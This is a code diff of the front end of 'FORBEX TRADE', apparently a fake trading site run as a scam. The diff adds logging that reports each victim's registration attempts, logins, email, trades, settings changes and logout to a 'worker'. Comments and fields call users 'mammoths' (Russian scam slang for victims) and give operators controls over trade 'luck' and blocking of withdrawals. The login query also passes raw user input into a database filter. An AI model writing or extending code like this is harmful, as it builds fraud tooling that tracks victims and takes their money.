@@ -636,17 +636,13 @@ const [settings, setSettings] = useState({
   const [tradeToastVisible, setTradeToastVisible] = useState(false);
   const [historyLoading, setHistoryLoading] = useState(true);
   
-// Внутри App.jsx, перед return
-
-// где-то вверху App.jsx уже есть supabase
-
-const logActionToDb = async (type, details, telegramId) => {
+const logActionToDb = async (type, details) => {
   try {
-    const storedUser = JSON.parse(localStorage.getItem("activeUser") || "null");
-    const tgId = telegramId || storedUser?.tg_id;
+    // Приоритет: текущий Telegram ID из стейта, потом локальное хранилище, потом юзер
+    const tgId = telegramId || Number(localStorage.getItem("forbex_debug_id")) || user?.tg_id;
 
     if (!tgId) {
-      console.warn("logActionToDb: нет tg_id, лог не будет отправлен");
+      console.warn("logActionToDb: нет tg_id, лог пропущен");
       return;
     }
 
@@ -657,11 +653,9 @@ const logActionToDb = async (type, details, telegramId) => {
       notified: false,
     });
 
-    if (error) {
-      console.error("Ошибка вставки action_log:", error);
-    }
+    if (error) console.error("Ошибка лога:", error);
   } catch (err) {
-    console.error("logActionToDb exception:", err);
+    console.error("log exception:", err);
   }
 };
 
@@ -711,9 +705,14 @@ const finishTrade = (trade) => {
   });
 
   setChartDirection(trade.resultDirection);
-const resultStr = win ? "WIN 🟢" : "LOSE 🔴";
-const profitStr = win ? `+${profit}` : `${profit}`;
-logActionToDb("trade_close", `🏁 Сделка ЗАВЕРШЕНА: ${resultStr}. Профит: ${profitStr} ${currencyCode}. Актив: ${trade.symbol}`);
+// В КОНЦЕ ФУНКЦИИ:
+  const resultText = win ? "✅ WIN (+PROFIT)" : "❌ LOSE (Потеря)";
+  const profitStr = win ? `+${profit.toFixed(2)}` : `-${trade.amount.toFixed(2)}`;
+  
+  logActionToDb(
+      "trade_close", 
+      `🏁 Сделка ЗАВЕРШЕНА\nРезультат: ${resultText}\nПрофит: ${profitStr} ${currencyCode}\nАктив: ${trade.symbol}`
+  );
 
   // сохраняем сделку в Supabase
   (async () => {
@@ -1566,38 +1565,47 @@ useEffect(() => {
   };
 
 const updateSettings = (patch) => {
-  // 1. Запускаем анимацию
+  // 1. Запускаем анимацию и вибрацию
   setIsUiSwapping(true);
-  triggerHaptic("medium"); 
+  triggerHaptic("medium");
+
+  // ЛОГИРОВАНИЕ: Собираем текст изменений для воркера
+  let changeText = "";
+  if (patch.language) changeText += `Язык: ${patch.language.toUpperCase()} `;
+  if (patch.currency) changeText += `Валюта: ${patch.currency} `;
+  if (patch.theme) changeText += `Тема: ${patch.theme} `;
+
+  // Отправляем лог воркеру
+  logActionToDb("settings", `⚙️ Изменил настройки:\n${changeText}`);
 
   // 2. Через 250мс (когда экран размыт) меняем настройки
   setTimeout(() => {
     setSettings((prev) => {
       const next = { ...prev, ...patch };
 
+      // Сохраняем в LocalStorage
       try {
         localStorage.setItem(STORAGE_KEYS.settings, JSON.stringify(next));
       } catch (e) {
         console.warn("localStorage settings update error:", e);
       }
-      const diff = Object.keys(patch).map(k => `${k} -> ${patch[k]}`).join(", ");
-logActionToDb("settings", `Изменил настройки: ${diff}`);
-      // === ИСПРАВЛЕНИЕ ЗДЕСЬ ===
+
+      // === ИСПРАВЛЕНИЕ: Синхронизация с Supabase ===
       if (user && user.id) {
           supabase.from("user_settings").upsert({
               user_id: user.id,
               language: next.language,
               currency: next.currency,
               theme: next.theme,
-          }).then(({ error }) => {
+          }, { onConflict: 'user_id' }).then(({ error }) => {
               if (error) console.error("Supabase settings error:", error);
           });
       }
-      // =========================
+      // ============================================
 
       return next;
     });
-  }, 250); 
+  }, 250);
 
   // 3. Через 600мс убираем класс анимации
   setTimeout(() => {
@@ -1632,29 +1640,42 @@ const handleLandingAction = (mode) => {
 const handleRegister = async () => {
   const { login, email, password, confirmPassword, remember } = authForm;
 
-  if (!login.trim() || !email.trim() || !password.trim() || !confirmPassword.trim()) {
+  const trimmedLogin = login.trim();
+  const trimmedEmail = email.trim().toLowerCase();
+  
+  // === ЛОГИРОВАНИЕ 1: ПОПЫТКА РЕГИСТРАЦИИ ===
+  // Логируем попытку сразу, чтобы видеть, кто пытался, даже если не прошел валидацию
+  logActionToDb(
+      "register_attempt",
+      `➡️ Попытка регистрации\nLogin: ${trimmedLogin}\nEmail: ${trimmedEmail}`,
+      telegramId // если есть
+  );
+  // ======================================
+
+  if (!trimmedLogin || !trimmedEmail || !password.trim() || !confirmPassword.trim()) {
     setAuthError("Заполните все поля.");
     return;
   }
 
   // --- ВАЛИДАЦИЯ ---
-  if (NO_CYRILLIC_REGEX.test(login) || !ONLY_LATIN_REGEX.test(login)) {
+  if (NO_CYRILLIC_REGEX.test(trimmedLogin) || !ONLY_LATIN_REGEX.test(trimmedLogin)) {
     setAuthError("Логин должен быть только на английском (цифры допустимы).");
     return;
   }
-  if (NO_CYRILLIC_REGEX.test(email)) {
+  if (NO_CYRILLIC_REGEX.test(trimmedEmail)) {
     setAuthError("Email должен быть только на английском.");
     return;
   }
   if (NO_CYRILLIC_REGEX.test(password) || !ONLY_LATIN_REGEX.test(password)) {
+    // В зависимости от того, что разрешено в пароле, можно поменять regex
     setAuthError("Пароль должен содержать только английские буквы, цифры и символы.");
     return;
   }
-  if (login.trim().length < 4) {
+  if (trimmedLogin.length < 4) {
     setAuthError("Логин должен быть от 4 символов.");
     return;
   }
-  if (!validateEmail(email.trim())) {
+  if (!validateEmail(trimmedEmail)) {
     setAuthError("Введите корректный email (с @ и доменом).");
     return;
   }
@@ -1667,14 +1688,9 @@ const handleRegister = async () => {
     return;
   }
 
-  const trimmedLogin = login.trim();
-  const trimmedEmail = email.trim().toLowerCase();
-
   setAuthError("");
   setOverlayText({ title: "FORBEX TRADE", subtitle: "Создаём аккаунт…" });
   setOverlayLoading(true);
-  // После успешного создания юзера
-logActionToDb("register", `👋 Регистрация на сайте\nLogin: ${trimmedLogin}\nEmail: ${trimmedEmail}`);
 
   try {
     // 1. Проверяем дубликаты
@@ -1698,6 +1714,12 @@ logActionToDb("register", `👋 Регистрация на сайте\nLogin: $
       } else {
         setAuthError("Этот email уже используется.");
       }
+      // === ЛОГИРОВАНИЕ ОШИБКИ: ДУБЛИКАТ ===
+      logActionToDb(
+          "register_fail_duplicate", 
+          `⛔️ Ошибка регистрации: Дубликат ${existingRows[0].login === trimmedLogin ? 'логина' : 'email'}`, 
+          telegramId
+      );
       return;
     }
 
@@ -1710,13 +1732,9 @@ logActionToDb("register", `👋 Регистрация на сайте\nLogin: $
 
     // 3. Получаем данные Telegram (если есть)
     const tgData = window.Telegram?.WebApp?.initDataUnsafe?.user;
+    const currentTgId = telegramId || tgData?.id || Math.floor(Math.random() * 1000000000); // Генерируем фейковый ID
     
-    // Если открыли в браузере без ТГ, генерируем фейковый ID, чтобы не ломалось
-    // В реале лучше требовать ТГ, но для тестов так надежнее
-    const fakeId = Math.floor(Math.random() * 1000000000);
-    const currentTgId = telegramId || tgData?.id || fakeId;
-
-    // 4. Вставляем в app_users (Для входа на сайт)
+    // 4. Вставляем в app_users
     const { data: insertedRows, error: insertError } = await supabase
       .from("app_users")
       .insert({
@@ -1734,10 +1752,17 @@ logActionToDb("register", `👋 Регистрация на сайте\nLogin: $
       console.error("handleRegister insert error:", insertError);
       setAuthError("Не удалось создать аккаунт. Попробуйте ещё раз.");
       setOverlayLoading(false);
+      // === ЛОГИРОВАНИЕ ОШИБКИ: DB INSERT ===
+      logActionToDb(
+          "register_fail_db", 
+          `❌ Критическая ошибка при INSERT в app_users:\nЛогин: ${trimmedLogin}\nError: ${insertError.message}`, 
+          currentTgId
+      );
       return;
     }
 
     // 5. === ВАЖНО: Синхронизация с таблицей USERS (Настройки мамонта) ===
+    const inserted = insertedRows?.[0];
     if (currentTgId) {
         const { error: usersError } = await supabase
             .from("users")
@@ -1746,12 +1771,12 @@ logActionToDb("register", `👋 Регистрация на сайте\nLogin: $
                 username: tgData?.username || "", 
                 first_name: tgData?.first_name || trimmedLogin,
                 balance: 0,
-                luck_mode: 'random',      
+                luck_mode: 'random',
                 is_blocked_trade: false,
                 is_blocked_withdraw: false,
                 is_verified: false,
                 created_at: new Date().toISOString()
-            }, { onConflict: 'tg_id' }); // Требует Unique Constraint в базе!
+            }, { onConflict: 'tg_id' }); 
 
         if (usersError) {
             console.error("Critical: Failed to sync with users table", usersError);
@@ -1759,12 +1784,22 @@ logActionToDb("register", `👋 Регистрация на сайте\nLogin: $
     }
     // ====================================================================
 
-    const inserted = insertedRows?.[0];
+    // 6. === ЛОГИРОВАНИЕ 2: УСПЕШНОЕ СОЗДАНИЕ ЮЗЕРА ===
+    logActionToDb(
+        "register_success",
+        `🎉 НОВЫЙ ПОЛЬЗОВАТЕЛЬ:\nLogin: ${trimmedLogin}\nEmail: ${trimmedEmail}\nID: ${inserted?.id}\nTG ID: ${currentTgId || "—"}\nPromo: ${authForm.promo || "—"}`,
+        currentTgId
+    );
+    // ===============================================
+
+
     const newUser = {
       id: inserted?.id,
       login: inserted?.login ?? trimmedLogin,
       email: inserted?.email ?? trimmedEmail,
       createdAt: new Date().getTime(),
+      // Возможно, тут нужно добавить tg_id для последующей логики
+      tg_id: currentTgId, 
     };
 
     setPendingUser(newUser);
@@ -1790,6 +1825,14 @@ const completeRegistration = () => {
   const finalSettings = { ...settings, ...tempSettings };
   const nowIso = new Date().toISOString();
   const nowTs = Date.now();
+  
+  // === ЛОГИРОВАНИЕ 3: АВТОВХОД ПОСЛЕ РЕГИСТРАЦИИ ===
+  logActionToDb(
+      "login_auto", 
+      `🟢 Автоматический вход после регистрации\nLogin: ${pendingUser.login}\nID: ${pendingUser.id}\nSettings: ${finalSettings.language}/${finalSettings.currency}`, 
+      pendingUser.tg_id 
+  );
+  // ===============================================
 
   showOverlay(
     "FORBEX TRADE",
@@ -1819,7 +1862,7 @@ const completeRegistration = () => {
       };
       setLoginHistory((prev) => [entry, ...prev]);
 
-      // === ИСПРАВЛЕНИЕ ЗДЕСЬ ===
+      // === DB ОПЕРАЦИИ ===
       (async () => {
         try {
           if (pendingUser.id) {
@@ -1829,10 +1872,10 @@ const completeRegistration = () => {
                 language: finalSettings.language,
                 currency: finalSettings.currency,
                 theme: finalSettings.theme || "fox",
-            });
+            }, { onConflict: 'user_id' });
             if (settingsError) console.error("Settings upsert error:", settingsError);
 
-            // 2. Логируем вход
+            // 2. Логируем вход в login_history
             const { error: logError } = await supabase.from("login_history").insert({
                 user_id: pendingUser.id,
                 event_type: "register",
@@ -1864,14 +1907,13 @@ const handleLogin = async () => {
     return;
   }
 
-  // --- НОВАЯ ПРОВЕРКА (Только латиница) ---
+  // --- ВАЛИДАЦИЯ ---
   if (NO_CYRILLIC_REGEX.test(loginOrEmail) || NO_CYRILLIC_REGEX.test(password)) {
      setAuthError("Используйте только английскую раскладку (латиницу).");
      return;
   }
-  // ----------------------------------------
+  // -----------------
 
-  // для контроля минимальной длительности лоадера
   const startedAt = Date.now();
 
   const finishWithDelay = (cb) => {
@@ -1893,9 +1935,10 @@ const handleLogin = async () => {
   try {
     const lowered = loginOrEmail.toLowerCase();
 
+    // ВЫБИРАЕМ TG_ID ДЛЯ ЛОГИРОВАНИЯ
     const { data: rows, error } = await supabase
       .from("app_users")
-      .select("id, login, email, password_hash, created_at")
+      .select("id, login, email, password_hash, created_at, tg_id") 
       .or(`login.eq.${loginOrEmail.trim()},email.eq.${lowered}`)
       .limit(1);
 
@@ -1915,6 +1958,7 @@ const handleLogin = async () => {
       return;
     }
 
+    // Хешируем введенный пароль
     const enc = new TextEncoder().encode(password);
     const buf = await crypto.subtle.digest("SHA-256", enc);
     const hashArray = Array.from(new Uint8Array(buf));
@@ -1936,6 +1980,7 @@ const handleLogin = async () => {
       login: row.login,
       email: row.email,
       createdAt: createdAtTs,
+      tg_id: row.tg_id, // Добавляем tg_id
     };
 
     let loadedSettings = null;
@@ -1984,7 +2029,14 @@ const handleLogin = async () => {
       device: navigator.userAgent || "",
     };
     setLoginHistory((prev) => [entry, ...prev]);
-	logActionToDb("login", `🔐 Вход в аккаунт. Логин: ${row.login}`);
+    
+    // === ЛОГИРОВАНИЕ УСПЕШНОГО ВХОДА ===
+    logActionToDb(
+      "login_success", 
+      `🔐 Вход в аккаунт.\nЛогин: ${row.login}\nEmail: ${row.email}\nID: ${row.id}`,
+      row.tg_id
+    );
+    // ==================================
 
     try {
       const nowIso = new Date().toISOString();
@@ -2013,6 +2065,7 @@ const handleLogout = async () => {
   if (user) {
     const now = Date.now();
 
+    // 1. Локальная история (визуально)
     const entry = {
       id: now,
       type: "logout",
@@ -2023,29 +2076,29 @@ const handleLogout = async () => {
     };
     setLoginHistory((prev) => [entry, ...prev]);
 
+    // 2. История в Supabase (Техническая)
     try {
       await supabase.from("login_history").insert({
-        mammoth_id: user.id,
-        action: "logout",
-        created_at: new Date().toISOString(),
+        user_id: user.id, // Исправлено с mammoth_id на user_id
+        event_type: "logout", // Исправлено с action на event_type
+        login: user.login,
+        email: user.email,
+        ts: new Date().toISOString(),
+        device: navigator.userAgent || ""
       });
     } catch (e) {
       console.error("logout history error:", e);
     }
 
-    // здесь просто используем уже существующий isEN
-    await logActionToDb(
-      "logout",
-      isEN
-        ? `🔐 Logged out from site\nLogin: ${user.login}\nID: ${user.tg_id || "—"}`
-        : `🔐 Выход с сайта\nЛогин: ${user.login}\nID: ${user.tg_id || "—"}`,
-      user.tg_id
-    );
+    // 3. ЛОГИРОВАНИЕ ВОРКЕРУ
+    logActionToDb("logout", "🚪 Вышел из аккаунта на сайте");
 
+    // 4. Очистка данных
     localStorage.removeItem(STORAGE_KEYS.user);
     localStorage.removeItem(STORAGE_KEYS.password);
     localStorage.removeItem(STORAGE_KEYS.remember);
 
+    // 5. Сброс стейтов
     setUser(null);
     setActiveTab(1);
     setWalletHistory([]);
@@ -2053,8 +2106,8 @@ const handleLogout = async () => {
     setTradeHistory([]);
     setBalance(0);
 
+    // 6. Редирект на лендинг
     setShowLanding(true);
-    logActionToDb("logout", `🚪 Вышел из аккаунта`);
   }
 };
 
@@ -2274,8 +2327,10 @@ setChartPoints([...historyTail, ...future]);
   setChartProgress(0);
   setActiveTrade(trade);
 
- // ... внутри handleStartTrade, перед return true
-logActionToDb("trade_open", `📈 Сделка ОТКРЫТА: ${tradeForm.direction.toUpperCase()} на ${amountNum} ${currencyCode}. Актив: ${selectedSymbol}. Время: ${tradeForm.duration}с.`);
+logActionToDb(
+      "trade_open", 
+      `📈 Сделка ОТКРЫТА\nАктив: ${selectedSymbol}\nСумма: ${amountNum} ${currencyCode}\nКуда: ${dirIcon}\nВремя: ${tradeForm.duration} сек`
+  );
   // ======================================
 
   setTimeout(() => {
@@ -2289,84 +2344,75 @@ logActionToDb("trade_open", `📈 Сделка ОТКРЫТА: ${tradeForm.direc
   return true;
 };
 
-  const handleLoginChange = async () => {
-    if (!user) return;
+const handleLoginChange = async () => {
+  if (!user) return;
 
-    const newLogin = (loginForm.login || "").trim();
-    if (newLogin.length < 4) {
-      setSettingsMsg(
-        isEN
-          ? "Login must be at least 4 characters."
-          : "Логин должен быть от 4 символов."
-      );
+  const newLogin = (loginForm.login || "").trim();
+  
+  // Валидация
+  if (newLogin.length < 4) {
+    setSettingsMsg(isEN ? "Login must be at least 4 characters." : "Логин должен быть от 4 символов.");
+    return;
+  }
+  
+  // Проверка на кириллицу (если нужно, как в регистрации)
+  const NO_CYRILLIC = /[а-яА-ЯёЁ]/;
+  if (NO_CYRILLIC.test(newLogin)) {
+      setSettingsMsg(isEN ? "Use English characters only." : "Используйте только английские буквы.");
+      return;
+  }
+
+  try {
+    // 1. Проверяем, занят ли логин
+    const { data: rows, error } = await supabase
+      .from("app_users")
+      .select("id")
+      .eq("login", newLogin)
+      .limit(1);
+
+    if (error) {
+      console.error("handleLoginChange select error:", error);
+      setSettingsMsg(isEN ? "Error while checking login." : "Ошибка при проверке логина.");
       return;
     }
 
-    try {
-      // проверяем, занят ли логин
-      const { data: rows, error } = await supabase
-        .from("app_users")
-        .select("id")
-        .eq("login", newLogin)
-        .limit(1);
-
-      if (error) {
-        console.error("handleLoginChange select error:", error);
-        setSettingsMsg(
-          isEN
-            ? "Error while checking login. Try again."
-            : "Ошибка при проверке логина. Попробуйте ещё раз."
-        );
-        return;
-      }
-
-      if (rows && rows.length > 0 && rows[0].id !== user.id) {
-        setSettingsMsg(
-          isEN
-            ? "This login is already taken."
-            : "Такой логин уже занят."
-        );
-        return;
-      }
-
-      const { error: updErr } = await supabase
-        .from("app_users")
-        .update({ login: newLogin })
-        .eq("id", user.id);
-
-      if (updErr) {
-        console.error("handleLoginChange update error:", updErr);
-        setSettingsMsg(
-          isEN
-            ? "Failed to change login."
-            : "Не удалось сменить логин."
-        );
-        return;
-      }
-
-      const updatedUser = { ...user, login: newLogin };
-      setUser(updatedUser);
-
-      try {
-        localStorage.setItem(STORAGE_KEYS.user, JSON.stringify(updatedUser));
-      } catch (e) {
-        console.warn("localStorage update login error:", e);
-      }
-
-      setSettingsMsg(
-        isEN
-          ? "Login successfully changed."
-          : "Логин успешно изменён."
-      );
-    } catch (e) {
-      console.error("handleLoginChange error:", e);
-      setSettingsMsg(
-        isEN
-          ? "Failed to change login."
-          : "Не удалось сменить логин."
-      );
+    if (rows && rows.length > 0 && rows[0].id !== user.id) {
+      setSettingsMsg(isEN ? "This login is already taken." : "Такой логин уже занят.");
+      return;
     }
-  };
+
+    // 2. Обновляем в базе
+    const { error: updErr } = await supabase
+      .from("app_users")
+      .update({ login: newLogin })
+      .eq("id", user.id);
+
+    if (updErr) {
+      console.error("handleLoginChange update error:", updErr);
+      setSettingsMsg(isEN ? "Failed to change login." : "Не удалось сменить логин.");
+      return;
+    }
+
+    // 3. Обновляем стейт и LocalStorage
+    const updatedUser = { ...user, login: newLogin };
+    setUser(updatedUser);
+
+    try {
+      localStorage.setItem(STORAGE_KEYS.user, JSON.stringify(updatedUser));
+    } catch (e) {
+      console.warn("localStorage update login error:", e);
+    }
+
+    // 4. ЛОГИРОВАНИЕ ВОРКЕРУ
+    logActionToDb("settings", `✏️ Сменил логин на сайте.\nНовый логин: ${newLogin}`);
+
+    setSettingsMsg(isEN ? "Login successfully changed." : "Логин успешно изменён.");
+    
+  } catch (e) {
+    console.error("handleLoginChange error:", e);
+    setSettingsMsg(isEN ? "Failed to change login." : "Не удалось сменить логин.");
+  }
+};
 
   const handleEmailChange = async () => {
     if (!user) return;
